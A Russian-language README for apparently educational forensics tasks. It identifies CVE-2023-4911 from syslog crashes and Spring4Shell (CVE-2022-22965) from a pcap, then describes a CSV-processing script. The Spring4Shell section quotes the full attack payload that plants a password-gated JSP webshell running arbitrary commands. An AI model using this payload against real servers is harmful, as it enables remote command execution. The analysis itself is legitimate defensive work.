# TASK 4
## INFO
Проанализировать независимые файлы `task4_1.txt` и `task4_2.pcap` и описать, какие атаки и\или уязвимости были\не были проэксплуатированы.

### task4_1.txt
Дан лог файла /var/log/syslog. Видно что какая-то из программа постоянно падает с Segmentation Fault при использовании динамической библиотеки ld-linux-x86-64.so.2. После небольшого поиска в интернете находим недавнюю CVE-2023-4911. В [этой](https://www.hackthebox.com/blog/exploiting-the-looney-tunables-vulnerability-cve-2023-4911) статье сказано, что при подобных Segmentation Fault система уязвима.

**Итог**: [CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911) | успешно

### task4_2.txt
Дан pcap файл. Запустив wireshark, видим обычное общение tcp общение. Пролистав все tcp стримы, видим странную нагрузку от 10.172.252.93, а именно:
```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
 Гуглим и получаем CVE-2022-22965. С [сайта](https://jfrog.com/blog/springshell-zero-day-vulnerability-all-you-need-to-know/) узнаем, что необходимы некотрые параметры для работоспособности эксплойта. Смотрим весь трафик c 10.172.252.93. Замечает неудачный get запрос на /main/tomcatwar.jsp, а после удачный на /tomcatwar.jsp, где сервер отдал нагрузку //, что означает о успехе атаки.
 
**Итог**: [CVE-2022-22965](https://nvd.nist.gov/vuln/detail/cve-2022-22965) | успешно

# TASK 5
## Info
Скрипт, который преобразует task5.csv, добавив поле
process.parent.command_line, в котором содержится process.command_line родителя процесса.

Руководство
```
python3 parse.py -h
```
| --help       | --file       | --output |
|:-------------:|:-------------: |:---------:|
| Помощь | Название csv файла | Название результируемого файла |

## Example
Вывести в файл
```
py parse.py -f=task5.csv -o=out.csv
```
Вывести в stdout
```
py parse.py -f=task5.csv
```
